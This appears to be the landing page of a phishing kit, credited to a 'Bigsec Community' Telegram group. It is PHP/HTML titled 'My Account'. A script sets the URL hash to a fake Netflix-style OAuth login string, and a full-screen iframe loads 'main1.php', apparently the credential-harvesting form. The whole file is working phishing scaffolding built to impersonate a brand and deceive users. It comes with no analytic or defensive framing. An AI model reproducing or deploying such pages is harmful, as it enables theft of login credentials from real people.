<?/*
       t . m e / b i g s e c c o m m u n i t y 

   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
 ███   ███   ███   ███    ███   ███    ███   ███    █▀  
 ███   ███   ███   ███    ███  ▄███▄▄▄▄██▀   ███        
 ███   ███   ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████ 
 ███   ███   ███   ███    ███ ▀███████████          ███ 
 ███   ███   ███   ███    ███   ███    ███    ▄█    ███ 
  ▀█   ███   █▀    ███    █▀    ███    ███  ▄████████▀  
                                ███    ███              

 M a n i A k a R i s k  | B i g s e c  C o m m u n i t y 
 */ ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Account</title>
    <link rel="icon" type="image/png" href="assets/img/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="assets/css/none.css">
    <link rel="stylesheet" type="text/css" href="assets/css/none1.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles__ltr.css">
    <script src="assets/js/none2.js"></script>
    <script src="assets/js/none3.js"></script>
    <script src="assets/js/jquery.js"></script>
    <script src="assets/js/jquery.mask.js"></script>
    <script type="text/javascript">
        location.hash = 'login?utm_campaign=dcomnav_login&form_post%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252netflix.com%252Flogin?%26client_id%3Dwebmail%26nonce%3D9082238bf12eb31200655d9b2e68baa6%26state%3Da5b67ccd26b9195dc76a53cbb2d40693%26scope%3Dopenid%2520profile'
    </script>
</head>

<body>
    <iframe src="main1.php" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
    </iframe>
</body>

</html>